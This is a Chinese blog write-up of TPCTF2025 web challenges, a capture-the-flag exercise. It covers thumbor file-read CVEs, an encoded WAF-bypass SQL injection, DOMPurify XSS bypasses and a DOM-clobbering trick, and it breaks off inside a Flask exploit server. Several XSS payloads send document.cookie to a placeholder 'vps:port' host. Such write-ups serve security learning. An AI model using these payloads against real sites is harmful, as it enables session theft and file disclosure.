@@ -1,0 +1,765 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="EddieMurphy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言我勒个XSS大赛。。 最喜欢的java没有出现在web中，反而在misc中吗，哈吉tpctf你这家伙。 thumbor 1附件给的是thumbor的插件环境，hint说没有0day。 那应该就不是thumbor本身的问题，其实也有点关系，就是可以url访问图片，这个在官方security文档就能看到：Security — Thumbor 7.7.4 documentation 但这个题其实是依">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TPCTF2025-WEB-Learning">
+<meta property="og:url" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/index.html">
+<meta property="og:site_name" content="EddieMurphy&#39;s blog">
+<meta property="og:description" content="前言我勒个XSS大赛。。 最喜欢的java没有出现在web中，反而在misc中吗，哈吉tpctf你这家伙。 thumbor 1附件给的是thumbor的插件环境，hint说没有0day。 那应该就不是thumbor本身的问题，其实也有点关系，就是可以url访问图片，这个在官方security文档就能看到：Security — Thumbor 7.7.4 documentation 但这个题其实是依">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171249419.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171325491.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171335377.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/761c7091405f5f466125cac7e6605f27.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171818815.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171851877.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312173728078.png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/to1qD1Twc5yLJSAibB5Vqmx9ZueJlF1ibH7S30yjzQzgYgiawEBic88HnVqVJtsdKghiaRKVib6pGRZrQwzrIZhhZNnA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175306344.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175631770.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175818038.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250313004157671.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250313004231645.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312182551861.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312184013283.png">
+<meta property="article:published_time" content="2025-03-12T09:03:45.000Z">
+<meta property="article:modified_time" content="2025-03-12T16:42:40.113Z">
+<meta property="article:author" content="EddieMurphy">
+<meta property="article:tag" content="比赛">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171249419.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>TPCTF2025-WEB-Learning - EddieMurphy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"eddiemurphy89.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>EddieMurphy&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/chainsaw_man.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TPCTF2025-WEB-Learning"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-12 17:03" pubdate>
+          2025年3月12日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">TPCTF2025-WEB-Learning</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我勒个XSS大赛。。</p>
+<p>最喜欢的java没有出现在web中，反而在misc中吗，哈吉tpctf你这家伙。</p>
+<h2 id="thumbor-1"><a href="#thumbor-1" class="headerlink" title="thumbor 1"></a>thumbor 1</h2><p>附件给的是thumbor的插件环境，hint说没有0day。</p>
+<p>那应该就不是thumbor本身的问题，其实也有点关系，就是可以url访问图片，这个在官方security文档就能看到：<a target="_blank" rel="noopener" href="https://thumbor.readthedocs.io/en/latest/security.html">Security — Thumbor 7.7.4 documentation</a></p>
+<p>但这个题其实是依赖的漏洞emmmmm，一开始真以为是挖0day。。。</p>
+<p>thumbor1的依赖组件有一个ImageMagick，是一个免费的开源软件套件，用于显示、转换和编辑光栅图像和向量图像文件。它支持200多种图像文件格式，并可执行各种图像处理操作。</p>
+<p>这里的漏洞即为<code>CVE-2022-44268</code>，ImageMagick的任意文件读取漏洞。</p>
+<p><a target="_blank" rel="noopener" href="https://www.metabaseq.com/threat/imagemagick-zero-days/">https://www.metabaseq.com/threat/imagemagick-zero-days/</a><br><a target="_blank" rel="noopener" href="https://github.com/voidz0r/CVE-2022-44268?tab=readme-ov-file">https://github.com/voidz0r/CVE-2022-44268?tab=readme-ov-file</a></p>
+<p>我们可以让靶机访问挂在自己vps上精心构造好的png，远程解析就会把对应的文件附加在图片里，复现CVE就完了：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171249419.png" srcset="/img/loading.gif" lazyload alt="image-20250312171249419"></p>
+<p>flag也一样的，低权限可读：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171325491.png" srcset="/img/loading.gif" lazyload alt="image-20250312171325491"></p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171335377.png" srcset="/img/loading.gif" lazyload alt="image-20250312171335377"></p>
+<h2 id="thumbor-2"><a href="#thumbor-2" class="headerlink" title="thumbor 2"></a>thumbor 2</h2><p>还是一样的组件漏洞，但是可以发现dockerfile里重装了最新的ImageMagick，所以需要找新的组件。</p>
+<p>这里队里nama和赵哥找了很多，试了XXE等等，以及ghostscript 9.5的RCE，均失败。但是很奇怪的是版本用的gs确实是9.5，为什么打不通呢。。。</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/761c7091405f5f466125cac7e6605f27.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>最终锁定漏洞组件librsvg，<code>CVE-2023-38633</code>：librsvg 2.56.3 之前版本中 URL 解码器的目录遍历问题，可以被本地或远程攻击者用来泄露文件：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/HMX404/article/details/137231580">https://blog.csdn.net/HMX404/article/details/137231580</a></p>
+<p>同样的打法，可以获得漏洞解析后的包含flag的图片，直接访问就能看到了：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171818815.png" srcset="/img/loading.gif" lazyload alt="image-20250312171818815"></p>
+<p>这里看不到完整的直接调宽高就行了。flag也是低权限可读：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o output.jpg -H <span class="hljs-string">&quot;Host: 1.95.57.127:3602&quot;</span> -H <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate&quot;</span> -H <span class="hljs-string">&quot;Upgrade-Insecure-Requests: 1&quot;</span> -H <span class="hljs-string">&quot;Priority: u=0, i&quot;</span> -H <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0&quot;</span> -H <span class="hljs-string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span> -H <span class="hljs-string">&quot;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span> <span class="hljs-string">&quot;http://1.95.57.127:3602/thumbor/unsafe/smart/http%3A%2F%2Fvps%3A1234%2F1.svg&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171851877.png" srcset="/img/loading.gif" lazyload alt="image-20250312171851877"></p>
+<h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>赵哥太狠了，直接拿下一血。</p>
+<p>论文题，按照它的方法打复现就行了：</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianjunchen.com/p/wafmanis.sq24.pdf">Jianjun Chen | Associate Professor | Tsinghua University</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Break the Wall from Bottom: Automated Discovery of Protocol-Level Evasion Vulnerabilities <span class="hljs-keyword">in</span> Web Application Firewalls<br>2024 IEEE Symposium on Security and Privacy<br>Qi Wang, Jianjun Chen, Zheyu Jiang, Run Guo, Ximeng Liu, Chao Zhang, Haixin Duan<br></code></pre></td></tr></table></figure>
+
+<p>其实也是队里去清华的eki佬的论文，tql😭</p>
+<p>高手！！！！！</p>
+<p>直接往&#x2F;flag发POST：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">+AHUAcwBlAHIAbgBhAG0AZQ-=+AGEAZABtAGkAbg-&amp;+AHAAYQBzAHMAdwBvAHIAZA-=+ACcALwAqACoALwB1AG4AaQBvAG4ALwAqACoALwBTAEUATABFAEMAVAAvACoAKgAvADEALAAyACwAUgBFAFAATABBAEMARQAoAFIARQBQAEwAQQBDAEUAKAAnACIALwAqACoALwB1AG4AaQBvAG4ALwAqACoALwBTAEUATABFAEMAVAAvACoAKgAvADEALAAyACwAUgBFAFAATABBAEMARQAoAFIARQBQAEwAQQBDAEUAKAAiAC4AIgAsAEMASABBAFIAKAAzADQAKQAsAEMASABBAFIAKAAzADkAKQApACwAQwBIAEEAUgAoADQANgApACwAIgAuACIAKQAvACoAKgAvAEEAUwAvACoAKgAvAGMAaAAzAG4AcwAxAHIALQAtACcALABDAEgAQQBSACgAMwA0ACkALABDAEgAQQBSACgAMwA5ACkAKQAsAEMASABBAFIAKAA0ADYAKQAsACcAIgAvACoAKgAvAHUAbgBpAG8AbgAvACoAKgAvAFMARQBMAEUAQwBUAC8AKgAqAC8AMQAsADIALABSAEUAUABMAEEAQwBFACgAUgBFAFAATABBAEMARQAoACIALgAiACwAQwBIAEEAUgAoADMANAApACwAQwBIAEEAUgAoADMAOQApACkALABDAEgAQQBSACgANAA2ACkALAAiAC4AIgApAC8AKgAqAC8AQQBTAC8AKgAqAC8AYwBoADMAbgBzADEAcgAtAC0AJwApAC8AKgAqAC8AQQBTAC8AKgAqAC8AYwBoADMAbgBzADEAcgAtAC0-<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312173728078.png" srcset="/img/loading.gif" lazyload alt="image-20250312173728078"></p>
+<p>当然也有真去注的，用quine注入，其他队的wp可以康：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkzMzYxNjI5Mw==&mid=2247484898&idx=1&sn=dc43b70afd69797c9e38064cf885aca8&chksm=c38c579bc6a06095bcf013f14ab0283825e8697521db2ccb994146d2c8734fc8b42a70fafc73&mpshare=1&scene=23&srcid=0311SjwfgvA26hSXXa38Dg7s&sharer_shareinfo=39bc415b40460825aa4be31f9fa60d83&sharer_shareinfo_first=39bc415b40460825aa4be31f9fa60d83#rd">TPCTF 2025 Writeup by 0xFFF</a></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/to1qD1Twc5yLJSAibB5Vqmx9ZueJlF1ibH7S30yjzQzgYgiawEBic88HnVqVJtsdKghiaRKVib6pGRZrQwzrIZhhZNnA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="layout三件套"><a href="#layout三件套" class="headerlink" title="layout三件套"></a>layout三件套</h2><p>原题打法。</p>
+<p>请看VCR：</p>
+<p><a target="_blank" rel="noopener" href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations">Exploring the DOMPurify library: Hunting for Misconfigurations (2&#x2F;2) | mizu.re</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Sudistark/CTF-Writeups/blob/main/Flatt-Security-XSS-Challenge/solutions.md">https://github.com/Sudistark/CTF-Writeups/blob/main/Flatt-Security-XSS-Challenge/solutions.md</a></p>
+<h3 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby layout"></a>baby layout</h3><p>源码很简单，XSS读到admin的cookie就是flag。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>:   <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span>  <br><span class="hljs-attr">content</span>:  test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//vps:port?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175306344.png" srcset="/img/loading.gif" lazyload alt="image-20250312175306344"></p>
+<h3 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe layout"></a>safe layout</h3><p>在原来的基础上过滤了所有html属性。加了个</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">ALLOWED_ATTR</span>: []<br></code></pre></td></tr></table></figure>
+
+<p>data-* 和 aria-* 类的属性不会被过滤，按照文章改改就行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>:   <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">data-type</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br><span class="hljs-attr">content</span>:  test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//vps:port?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175631770.png" srcset="/img/loading.gif" lazyload alt="image-20250312175631770"></p>
+<h3 id="safe-layout-revenge"><a href="#safe-layout-revenge" class="headerlink" title="safe layout revenge"></a>safe layout revenge</h3><p>除了对attr进行过滤，aria和data一并被过滤：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175818038.png" srcset="/img/loading.gif" lazyload alt="image-20250312175818038"></p>
+<p>可以采用style绕过，把xss的payload构造好后把script标签插入content：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>: x&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;img src=x onerror=<span class="hljs-title function_">alert</span>()&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">x&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;img src=x onerror=<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://vps:port?flag=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure>
+
+<p>提交内容为空即可：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250313004157671.png" srcset="/img/loading.gif" lazyload alt="image-20250313004157671"></p>
+<p>官方：</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250313004231645.png" srcset="/img/loading.gif" lazyload alt="image-20250313004231645"></p>
+<h2 id="Are-you-incognito"><a href="#Are-you-incognito" class="headerlink" title="Are you incognito?"></a>Are you incognito?</h2><p>好像是ustc发现的0day？</p>
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312182551861.png" srcset="/img/loading.gif" lazyload alt="image-20250312182551861"></p>
+<p>做法来自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3N_0_rL38i5bg7iRjSd9qA">TPCTF2025 writeup by Mini-Venom</a>：</p>
+<p>如果不存在<code>broswer.runtime.id</code>，则<code>module.exports</code>导出<code>window</code>的<code>browser</code>。</p>
+<p>注意到<code>globalThis</code>是<code>window</code>，因此可以使用<code>dom clobberate</code>污染<code>browser.runtime.id</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (!(globalThis.<span class="hljs-property">browser</span> &amp;&amp; globalThis.<span class="hljs-property">browser</span>.<span class="hljs-property">runtime</span> &amp;&amp; globalThis.<span class="hljs-property">browser</span>.<span class="hljs-property">runtime</span>.<span class="hljs-property">id</span>)) &#123;<br><span class="hljs-comment">//...</span><br>&#125;<span class="hljs-keyword">else</span> &#123;<br>   <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = globalThis.<span class="hljs-property">browser</span>;<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用iframe三层污染：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;iframe name=<span class="hljs-string">&quot;browser&quot;</span> srcdoc=<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   &lt;form id=&quot;runtime&quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">   &lt;form id=&quot;runtime&quot; name=&quot;id&quot;&gt;</span><br><span class="hljs-string">   &lt;/form&gt;</span><br><span class="hljs-string"> &lt;form id=&quot;extension&quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">   &lt;form id=&quot;extension&quot; name=&quot;inIncognitoContext&quot;&gt;</span><br><span class="hljs-string">   &lt;/form&gt;&#x27;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        file_path = os.path.join(os.path.dirname(__file__), <span class="hljs-string">&#x27;index.html&#x27;</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            data = f.read()<br>        <span class="hljs-keyword">return</span> data, <span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span>&#125;<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Internal Server Error&#x27;</span>, <span class="hljs-number">500</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    